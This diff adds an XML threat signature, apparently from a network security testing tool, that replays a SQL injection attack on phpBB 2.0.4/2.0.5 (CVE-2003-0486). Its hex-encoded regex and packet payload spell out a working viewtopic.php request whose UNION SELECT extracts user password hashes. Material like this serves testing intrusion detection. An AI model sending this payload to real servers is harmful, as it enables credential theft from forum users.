@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="phpBB SQL Injection Attack"/>
+    <EngDesc display="true" value="This threat performs a SQL injection attack against the popular web based bulletin board software phpBB.  This particular attack attempts to retrieve the password hashes of users.  phpBB is a web application and typically listens on port 80."/>
+    <Intent display="true">
+      <item value="Scoping"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="phpBB_Group"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="phpBB_Group_phpBB"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="phpBB_Group_phpBB_2.0.5"/>
+      <item value="phpBB_Group_phpBB_2.0.4"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://archives.neohapsis.com/archives/bugtraq/2003-06/att-0151/phpbb_sql.pl"/>
+    <CVEID display="true" value="CVE-2003-0486"/>
+    <bugtraqID display="true" value="7979"/>
+    <OSVDB display="true" value="2186"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000105981773d700c000a80001003c7eb9bb46"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200671875000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X47\X45\X54\X20\X2F\X70\X68\X70\X42\X42\X32\X2F\X76\X69\X65\X77\X74\X6F\X70\X69\X63\X2E\X70\X68\X70\X3F\X73\X69\X64\X3D\X31\X26\X74\X6F\X70\X69\X63\X5F\X69\X64\X3D\X2D\X31\X25\X32\X30\X75\X6E\X69\X25\X36\X66\X25\X36\X65\X25\X32\X30\X73\X65\X25\X36\X63\X65\X63\X25\X37\X34\X25\X32\X30\X6F\X25\X37\X32\X25\X36\X34\X28\X25\X37\X33\X75\X25\X36\X32\X73\X25\X37\X34\X25\X37\X32\X25\X36\X39\X25\X36\X65\X25\X36\X37\X25\X32\X38\X25\X37\X35\X25\X37\X33\X25\X36\X35\X72\X5F\X70\X25\X36\X31\X73\X73\X25\X37\X37\X25\X36\X66\X72\X25\X36\X34\X2C\X25\X33\X31\X25\X32\X63\X31\X29\X29\X25\X32\X30\X66\X25\X37\X32\X6F\X25\X36\X64\X25\X32\X30\X25\X37\X30\X25\X36\X38\X70\X25\X36\X32\X25\X36\X32\X25\X35\X66\X75\X25\X37\X33\X65\X72\X73\X25\X32\X30\X77\X25\X36\X38\X65\X72\X25\X36\X35\X25\X32\X30\X75\X73\X65\X25\X37\X32\X25\X35\X66\X25\X36\X39\X25\X36\X34\X3D\X32\X25\X32\X66\X2A\X26\X76\X69\X65\X77\X3D\X6E\X65\X77\X65\X73\X74\X20\X48\X54\X54\X50\X2F\X31\X2E\X30\X0A\X0A\X43\X6F\X6F\X6B\X69\X65\X3A\X20\X70\X68\X70\X42\X42\X32\X6D\X79\X73\X71\X6C\X5F\X73\X69\X64\X3D\X31\X0A\X48\X6F\X73\X74\X3A\X20\X65\X78\X61\X6D\X70\X6C\X65\X2E\X63\X6F\X6D\X0A\X0A"/>
+    <Created value="1139462374" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F7068704242322F76696577746F7069632E7068703F7369643D3126746F7069635F69643D2D31253230756E69253666253665253230736525366365632537342532306F253732253634282537337525363273253734253732253639253665253637253238253735253733253635725F702536317373253737253666722536342C253331253263312929253230662537326F25366425323025373025363870253632253632253566752537336572732532307725363865722536352532307573652537322535662536392536343D322532662A26766965773D6E657765737420485454502F312E300A0A436F6F6B69653A207068704242326D7973716C5F7369643D310A486F73743A206578616D706C652E636F6D0A0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
